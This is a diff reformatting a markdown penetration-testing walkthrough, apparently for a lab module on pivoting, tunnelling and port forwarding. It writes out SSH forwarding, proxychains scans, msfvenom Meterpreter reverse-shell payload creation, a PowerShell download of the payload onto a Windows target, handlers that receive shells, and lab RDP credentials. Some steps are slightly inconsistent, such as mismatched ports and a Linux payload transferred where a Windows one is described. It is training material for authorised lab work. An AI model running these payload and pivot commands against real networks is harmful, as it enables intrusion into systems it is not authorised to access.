@@ -377,11 +377,30 @@ Port forwarding is a technique that redirects a communication request from one p
 
 We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 nmap -sT -p22,3306 10.129.202.64
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
 Nmap scan report for 10.129.202.64
 Host is up (0.12s latency).
@@ -392,6 +411,10 @@ PORT     STATE  SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 ```
+
+</td>
+</tr>
+</table>
 
 Nmap shows the SSH port on the target is open. MySQL is running on the Ubuntu server and listening on localhost:3306, so it is not directly reachable from your machine. There are two practical options:
 
@@ -414,11 +437,20 @@ Why this helps:
 <details>
 <summary><h3>2. Executing the Local Port Forward</h2></summary>
 
-```bash
-ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
-```
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
+ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 ubuntu@10.129.202.64's password:
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 
@@ -448,13 +480,33 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 To see these additional updates run: apt list --upgradable
 ```
 
+</td>
+</tr>
+</table>
+
 By doing this, we should be able to access the MySQL service locally on port 1234.
 
 Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -463,24 +515,66 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 
 **Netstat**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netstat -antp | grep 1234
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh
 tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
 ```
 
+</td>
+</tr>
+</table>
+
 **Nmap**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 nmap -v -sV -p1234 localhost
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
 NSE: Loaded 45 scripts for scanning.
 Initiating Ping Scan at 12:18
@@ -510,6 +604,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -521,11 +619,30 @@ If we type `ifconfig` on the Ubuntu host, you will find that this server has mul
 - One communicating to other hosts within a different network (_ens224_)
 - The loopback interface (_lo_).
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
+
 ```bash
 ifconfig
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
         inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
@@ -554,6 +671,10 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 270  bytes 22432 (22.4 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
+
+</td>
+</tr>
+</table>
 
 When your attack host **has no route** to a target subnet (e.g. `172.16.5.0/23`), but you do have SSH access to a host inside that network (the Ubuntu box), you can pivot your scans and tools through that host using a **SOCKS proxy** created by SSH dynamic port forwarding.
 
@@ -616,9 +737,25 @@ In the above image, the attack host starts the SSH client and requests the SSH s
 
 The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port **9050**. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's **TCP traffic** to go through hosted proxies like **SOCKS4**/**SOCKS5**, **TOR**, or **HTTP**/**HTTPS** proxies.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 ssh -D 9050 ubuntu@10.129.202.64
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -627,15 +764,38 @@ ssh -D 9050 ubuntu@10.129.202.64
 
 To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 tail -4 /etc/proxychains.conf
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # meanwile
 # defaults set to "tor"
 socks4 	127.0.0.1 9050
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -644,11 +804,30 @@ socks4 	127.0.0.1 9050
 
 Now we want to run nmap through that SOCKS proxy using proxychains so scans originate from the pivot host and can reach an otherwise inaccessible subnet (e.g., `172.16.5.0/23`).
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 proxychains nmap -v -sn 172.16.5.1-200
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 ProxyChains-3.1 (http://proxychains.sf.net)
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
@@ -660,6 +839,10 @@ Scanning 10 hosts [2 ports/host]
 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
 ...
 ```
+
+</td>
+</tr>
+</table>
 
 - `proxychains` intercepts nmap’s TCP connections and routes them through the SOCKS proxy at `127.0.0.1:9050`.
 - That SOCKS proxy forwards the connections over the SSH tunnel to the pivot host, which then performs the network actions from inside the target network.
@@ -689,11 +872,30 @@ _UDP scanning is unreliable (or impossible) over SOCKS in many tools._
 
 So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at `172.16.5.19`.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 proxychains nmap -v -Pn -sT 172.16.5.19
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 ProxyChains-3.1 (http://proxychains.sf.net)
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
@@ -730,6 +932,10 @@ Discovered open port 3389/tcp on 172.16.5.19
 Discovered open port 139/tcp on 172.16.5.19
 ```
 
+</td>
+</tr>
+</table>
+
 The Nmap scan shows several open ports, one of which is RDP port (3389). Similar to the Nmap scan, we can also pivot msfconsole via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules.
 
 </details>
@@ -740,11 +946,20 @@ The Nmap scan shows several open ports, one of which is RDP port (3389). Similar
 
 We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
 
-```bash
-proxychains msfconsole
-```
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
+proxychains msfconsole
 ProxyChains-3.1 (http://proxychains.sf.net)
 ...
 Press SPACE BAR to continue
@@ -760,13 +975,36 @@ set LHOST eth0
 msf6 >
 ```
 
+</td>
+</tr>
+</table>
+
 **Using rdp_scanner Module**
 
-```bash
-msf6 > search rdp_scanner
-```
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
+search rdp_scanner
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Matching Modules
 ================
 
@@ -775,11 +1013,34 @@ Matching Modules
    0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
 ```
 
-```bash
-msf6 > search rdp_scanner
-```
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
+search rdp_scanner
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Matching Modules
 ================
 
@@ -788,13 +1049,36 @@ Matching Modules
    0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
 ```
 
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
+
 ```bash
-msf6 > use 0
+use 0
 msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
 msf6 auxiliary(scanner/rdp/rdp_scanner) > run
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
 |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
@@ -804,23 +1088,50 @@ msf6 auxiliary(scanner/rdp/rdp_scanner) > run
 [*] Auxiliary module execution completed
 ```
 
+</td>
+</tr>
+</table>
+
 At the bottom of the output above, we can see the RDP port open with the Windows OS version.
 
 Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using `xfreerdp`. The user in our case is `victor`, and the password is `pass@123`
 
 **Using rdp_scanner Module**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 ProxyChains-3.1 (http://proxychains.sf.net)
 [13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
 [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
 [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
 [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
 ```
+
+</td>
+</tr>
+</table>
 
 The `xfreerdp` command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.
 
@@ -913,11 +1224,30 @@ Use a pivot host that has connectivity to both networks. In this scenario the Ub
 
 **1. Creating a Windows Payload with msfvenom**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -926,61 +1256,166 @@ Final size of exe file: 7168 bytes
 Saved as: backupscript.exe
 ```
 
+</td>
+</tr>
+</table>
+
 **2. Configuring & Starting the multi/handler**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
+
 ```bash
-msf6 > use exploit/multi/handler
+use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
 msf6 exploit(multi/handler) > set lhost 0.0.0.0
 msf6 exploit(multi/handler) > set lport 8000
 msf6 exploit(multi/handler) > run
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 [*] Started HTTPS reverse handler on https://0.0.0.0:8000
 ```
+
+</td>
+</tr>
+</table>
 
 Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.
 
 **3. Transferring Payload to Pivot Host**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 scp backupscript.exe ubuntu@10.129.15.50:~/
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 backupscript.exe                                   100% 7168    65.4KB/s   00:00
 ```
+
+</td>
+</tr>
+</table>
 
 After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.
 
 **4. Starting Python3 Webserver on Pivot Host**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
+
 ```bash
 python3 -m http.server 8123
 ```
+
+</td>
+</tr>
+</table>
 
 **5. Downloading Payload on the Windows Target**
 
 We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
 
-```CMD
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
+
+```powershell
 Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
+
+</td>
+</tr>
+</table>
 
 Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.
 
 **6. Using SSH -R**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
 ```
+
+</td>
+</tr>
+</table>
 
 After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
 
 **7. Viewing the Logs from the Pivot**
 
-```bash
+<table width="100%">
+<tr>
+<td> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
 debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
 debug1: channel 1: new [172.16.5.19]
@@ -996,11 +1431,22 @@ debug1: confirm forwarded-tcpip
 debug1: channel 0: connected to 0.0.0.0 port 8000
 ```
 
+</td>
+</tr>
+</table>
+
 If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
 
 **8. Meterpreter Session Established**
 
-```bash
+<table width="100%">
+<tr>
+<td> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 [*] Started HTTPS reverse handler on https://0.0.0.0:8000
 [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
 [*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
@@ -1010,11 +1456,34 @@ If all is set up properly, we will receive a Meterpreter shell pivoted via the U
 meterpreter >
 ```
 
-```bash
-meterpreter > shell
-```
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`meterpreter >`**
+
+</td>
+<td>
 
 ```bash
+shell
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 Process 3236 created.
 Channel 1 created.
 Microsoft Windows [Version 10.0.17763.1637]
@@ -1022,6 +1491,10 @@ Microsoft Windows [Version 10.0.17763.1637]
 
 C:\>
 ```
+
+</td>
+</tr>
+</table>
 
 Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.
 
@@ -1078,11 +1551,30 @@ In some scenarios, we may already have Meterpreter shell access on the Ubuntu se
 
 We can generate a Meterpreter shell for the Ubuntu server, which will give us a shell on our attack host listening on port 8080.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f elf -o shell.elf
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
 # No encoder specified, outputting raw payload
@@ -1091,18 +1583,57 @@ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f el
 # Saved as: shell.elf
 ```
 
+</td>
+</tr>
+</table>
+
 **Transfer the Payload to the Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # ubuntu@10.129.202.64's password:
 # shell.elf
 ```
 
+</td>
+</tr>
+</table>
+
 Before executing the payload over, we can start a Metasploit multi/handler, also known as a Generic Payload Handler.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
@@ -1117,7 +1648,23 @@ Before executing the payload over, we can start a Metasploit multi/handler, also
 # [*] Started reverse TCP handler on 10.10.14.40:4444
 ```
 
+</td>
+</tr>
+</table>
+
 **Execute the Payload on the Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
 
 ```bash
 ubuntu@WebServer:~$ ls
@@ -1126,13 +1673,40 @@ chmod +x shell.elf
 ./shell.elf
 ```
 
+</td>
+</tr>
+</table>
+
 **Confirm the Meterpreter Session back in the MSFCONSOLE**
 
-```bash
+<table width="100%">
+<tr>
+<td> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 # [*] Meterpreter session 1 opened (10.10.14.40:4444 -> 10.129.202.64:36500) at 2025-11-27 18:44:12 -0600
 ```
 
+</td>
+</tr>
+</table>
+
 **Check interfaces**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`meterpreter >`**
+
+</td>
+<td>
 
 ```bash
 
@@ -1187,10 +1761,26 @@ chmod +x shell.elf
 #   1         meterpreter x64/linux  ubuntu @ 10.129.202.64  10.10.14.40:4444 -> 10.129.202.64:36500 (10.129.202.64)
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
 <summary><h4>2. Automatically Adding Routes with Autoroute</h4></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
 [msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
@@ -1221,6 +1811,10 @@ chmod +x shell.elf
 # [*] There are currently no IPv6 routes defined.
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -1229,6 +1823,18 @@ chmod +x shell.elf
 This allows external tools (proxychains, nmap, etc.) to pivot through Meterpreter.
 
 **Start the SOCKS Proxy Server**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
 [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use auxiliary/server/socks_proxy
@@ -1245,6 +1851,10 @@ This allows external tools (proxychains, nmap, etc.) to pivot through Meterprete
 #NOTE: PRESS ENTER TO KEEP USING THE CONSOLE
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -1252,9 +1862,25 @@ This allows external tools (proxychains, nmap, etc.) to pivot through Meterprete
 
 Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -1262,6 +1888,18 @@ grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.
 <summary><h4>5. Scanning Internal Hosts via Meterpreter</h4></summary>
 
 **Ping Sweep using Meterpreter**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`meterpreter >`**
+
+</td>
+<td>
 
 ```bash
 [msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
@@ -1274,6 +1912,10 @@ grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.
 # [+] 	172.16.5.129 host found
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -1283,22 +1925,61 @@ grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.
 
 Port forwarding can be accomplished using Meterpreter's portfwd module.
 
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`meterpreter >`**
+
+</td>
+<td>
+
 ```bash
 (Meterpreter 1)(/home/ubuntu) > portfwd add -l 3389 -p 3389 -r 172.16.5.19
 [*] Forward TCP relay created: (local) :3389 -> (remote) 172.16.5.19:3389
 ```
 
+</td>
+</tr>
+</table>
+
 The above command requests the Meterpreter session to start a listener on our attack host's locmeal port (-l) 3389 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3389, we will be able to create a remote desktop session.
 
 **Verify Forwarding with netcat**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 nc -v 127.0.0.1 3389
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # localhost [127.0.0.1] 3389 (ms-wbt-server) open
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -1307,11 +1988,30 @@ nc -v 127.0.0.1 3389
 
 **Use xfreerdp:**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 xfreerdp /v:localhost /u:victor /p:pass@123
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
 # [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
 # [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-1640397/.config/freerdp/server]
@@ -1335,6 +2035,10 @@ xfreerdp /v:localhost /u:victor /p:pass@123
 # Please look at the OpenSSL documentation on how to add a private CA to the store.
 # Do you trust the above certificate? (Y/T/N) y
 ```
+
+</td>
+</tr>
+</table>
 
 Once accepted, you will gain full RDP access to the internal host.
 
@@ -1398,9 +2102,25 @@ flowchart LR
 
 Metasploit's listener can be started on the attack host using the following command.
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
+
 ```bash
 socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 ```
+
+</td>
+</tr>
+</table>
 
 Socat listens on localhost:8080 and forwards all traffic to port 80 on the attack host (10.10.14.18). After configuring the redirector, a payload can be created to connect back to the redirector running on the Ubuntu server.
 
@@ -1408,11 +2128,30 @@ A listener must also be started on the attack host because any connection receiv
 
 **Creating the Windows Payload**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
 # No encoder specified, outputting raw payload
@@ -1421,23 +2160,78 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o b
 # Saved as: backupscript.exe
 ```
 
+</td>
+</tr>
+</table>
+
 Now, we must transfer this payload to the Windows host.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # [-]
 ```
 
+</td>
+</tr>
+</table>
+
 **Starting MSF Console**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo msfconsole
 ```
 
+</td>
+</tr>
+</table>
+
